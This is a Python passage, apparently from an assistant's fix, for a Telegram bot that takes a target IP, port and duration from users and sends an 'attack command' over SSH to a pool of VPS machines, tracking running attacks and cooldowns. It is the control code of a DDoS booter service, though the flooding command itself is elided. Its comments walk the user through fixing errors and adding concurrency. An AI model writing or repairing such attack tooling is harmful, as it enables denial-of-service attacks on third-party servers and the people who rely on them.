...
async def attack_input(update: Update, context: CallbackContext):
    ...
    if not validate_ip(ip):
        ...
        return ConversationHandler.END
    if not validate_port(port): # This line was causing the NameError
    ...
    # Cooldown check
    # Assuming global_cooldown and last_attack_time are defined globally
    # You might need to import `asyncssh` if you intend to use it for SSH connections.
    # For paramiko, you don't need asyncssh.
    # If you are using paramiko, ensure it's imported correctly.
    # from paramiko import SSHClient, AutoAddPolicy
    # from scp import SCPClient
    # import asyncio # for asyncio.sleep and asyncio.gather
    # import threading # for attack_lock
    
    # Placeholder for attack_lock if not defined elsewhere
    # attack_lock = threading.Lock() # Define this globally if not already

    # You need to define OWNER_ID for the SSH connection error message
    OWNER_ID = 123456789 # Replace with actual owner ID for error messages
    ...
    async def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
        ...
        running_attacks[attack_id_vps] = {
            ...
            'duration': duration,
            'vps_ip': ip_vps,
            'is_special': is_special_key_user # Pass this info for running attacks display
        }
        ...
        try:
            ...
            # You might want to read stdout/stderr if there's output
            stdout_output = stdout.read().decode().strip()
            stderr_output = stderr.read().decode().strip()
            
            if stdout_output:
                logging.info(f"VPS {ip_vps} stdout: {stdout_output}")
            if stderr_output:
                logging.error(f"VPS {ip_vps} stderr: {stderr_output}")

            logging.info(f"Attack command sent to VPS {ip_vps}")
            
            # Close SSH connection
            ssh.close()

            # Wait for the duration of the attack + a buffer
            await asyncio.sleep(duration + 5) # Added buffer for command execution

        except Exception as e:
            logging.error(f"SSH error on {ip_vps}: {str(e)}")
            if "connection" in str(e).lower():
                # Ensure OWNER_ID is defined or replaced with actual owner's chat ID
                # This should be a numeric ID, not a username.
                # Example: OWNER_ID = 123456789
                if 'OWNER_ID' in globals(): # Check if OWNER_ID is defined
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
            ...
            # Ensure running_attacks is a thread-safe dictionary if multiple attacks can run concurrently
            # For simplicity, if not using threading.Lock, ensure operations are atomic or handle concurrency
            # For this context, it's likely fine as it's per-VPS task.
            if attack_id_vps in running_attacks:
                del running_attacks[attack_id_vps]
            
            # Check if all tasks for this specific attack_id are finished
            # This logic needs to be careful in async environment.
            # A simple check for remaining attacks with the same base attack_id
            
            # This part needs adjustment if you want a single "Attack Finished" message
            # for the entire attack across all VPS.
            # For now, it will send a message per VPS finishing, which might be spammy.
            # A better approach is to have a counter for completed VPS tasks.
            
            # For now, let's remove the "Attack Finished" message per VPS and rely on /running
            pass # Removed per-VPS attack finish message for now
    ...
    try:
        ...
        if tasks:
            # Running tasks in the background without waiting for them to finish here
            # This allows the bot to respond immediately.
            # The actual attack completion message will be handled by _run_ssh_attack's finally block
            # or a separate monitoring mechanism.
            asyncio.create_task(asyncio.gather(*tasks, return_exceptions=True))
            
            # Instead of sending attack finished here, it should be sent once ALL VPS attacks complete.
            # This requires a more complex state management for the entire attack.
            # For now, the initial "Attack Started" message is sufficient.
            pass
        else:
            await update.message.reply_text(
                f"❌ *No valid threads assigned for attack!*\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
    except Exception as e:
